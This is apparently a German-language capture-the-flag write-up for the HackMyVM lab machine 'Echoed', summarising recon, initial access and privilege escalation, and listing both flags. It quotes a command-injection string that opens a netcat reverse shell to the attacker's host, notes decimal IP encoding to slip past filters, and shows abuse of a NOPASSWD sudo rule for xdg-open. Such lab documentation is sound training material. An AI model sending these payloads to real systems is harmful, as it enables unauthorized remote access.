# Echoed - HackMyVM (Medium)

![Echoed.png](Echoed.png)

## Übersicht

*   **VM:** Echoed
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Echoed)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 03. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Echoed_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Medium"-Challenge war es, Root-Zugriff auf der Maschine "Echoed" zu erlangen. Die Enumeration deckte SSH, einen Nginx-Webserver (Port 80) und einen unbekannten Dienst auf Port 4444 auf. Die Nmap-Fingerprints für Port 4444 deuteten auf eine Befehlsschnittstelle hin. Durch Senden eines präparierten Strings (`Command:";nc [Angreifer-IP-Dezimal] 4444 -e /bin/bash;#`) an diesen Port wurde eine Reverse Shell als Benutzer `charlie` erlangt. Als `charlie` wurde eine `sudo`-Regel entdeckt, die das Ausführen von `/usr/bin/xdg-open` als jeder Benutzer (`ALL:ALL`) ohne Passwort erlaubte. Durch Ausführen von `sudo xdg-open /pfad/zur/datei` konnte der Inhalt von Dateien mit Root-Rechten (wie `/root/root.txt` und `/home/charlie/user.txt`) direkt im Terminal ausgegeben werden, wodurch beide Flags erlangt wurden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `netcat` (nc)
*   `python3` (für pty-Shell-Stabilisierung)
*   `sudo` (auf Zielsystem)
*   `xdg-open` (als Exploit-Vektor)
*   Online IP Converter
*   Standard Linux-Befehle (`stty`, `export`, `cat`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Echoed" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.107`, Hostname `echo.hmv`).
    *   `nmap`-Scan identifizierte SSH (22/tcp), Nginx (80/tcp) und einen unbekannten Dienst auf Port 4444/tcp.
    *   Die Fingerprints für Port 4444 (`Command:Found illegal char.Command:`) deuteten auf eine Befehlsschnittstelle hin.
    *   `nikto` auf Port 80 fand keine kritischen Schwachstellen, nur fehlende Security Header.

2.  **Initial Access (als `charlie` via Port 4444 Exploit):**
    *   Die IP-Adresse des Angreifers wurde in das Dezimalformat umgewandelt (z.B. 192.168.2.121 -> 3232236153).
    *   Ein Netcat-Listener wurde auf dem Angreifer-System auf Port 4444 gestartet.
    *   Der folgende Exploit-String wurde an Port 4444 des Ziels gesendet (z.B. via `echo '...' | nc ...`): `Command:";nc [Angreifer-IP-Dezimal] 4444 -e /bin/bash;#`.
    *   Dies startete eine Reverse Shell, die sich zum Listener des Angreifers verband.
    *   Die Shell lief als Benutzer `charlie`. Die Shell wurde mit Python PTY und `stty` stabilisiert.

3.  **Privilege Escalation (zu `root`-Rechten via `sudo xdg-open`):**
    *   Als `charlie` zeigte `sudo -l`, dass `/usr/bin/xdg-open` als jeder Benutzer (`ALL:ALL`) ohne Passwort (`NOPASSWD:`) ausgeführt werden durfte.
    *   Durch Ausführen von `sudo xdg-open /home/charlie/user.txt` wurde die User-Flag (`HMVechocharlie`) direkt im Terminal ausgegeben.
    *   Durch Ausführen von `sudo xdg-open /root/root.txt` wurde die Root-Flag (`HMVcharlied`) direkt im Terminal ausgegeben.

## Wichtige Schwachstellen und Konzepte

*   **Unsicherer benutzerdefinierter Dienst (Port 4444):** Ein Dienst auf Port 4444 akzeptierte und führte beliebige Befehle aus, die in einem spezifischen Format gesendet wurden (Command Injection).
*   **Netcat Reverse Shell mit `-e` Option:** Die Verfügbarkeit der `-e` Option in `netcat` auf dem Zielsystem ermöglichte eine einfache Reverse Shell.
*   **IP-Adress-Verschleierung (Dezimalformat):** Eine Methode, um einfache Filter zu umgehen.
*   **Unsichere `sudo`-Regel (`xdg-open`):** Das Erlauben von `xdg-open` mit `NOPASSWD` und `ALL:ALL` ist eine kritische Fehlkonfiguration, die hier zum direkten Auslesen von Root-geschützten Dateien führte.

## Flags

*   **User Flag (`/home/charlie/user.txt`, gelesen via `sudo xdg-open`):** `HMVechocharlie`
*   **Root Flag (`/root/root.txt`, gelesen via `sudo xdg-open`):** `HMVcharlied`

## Tags

`HackMyVM`, `Echoed`, `Medium`, `Network Service Exploit`, `Command Injection`, `Netcat Reverse Shell`, `sudo`, `xdg-open`, `Privilege Escalation`, `Linux`
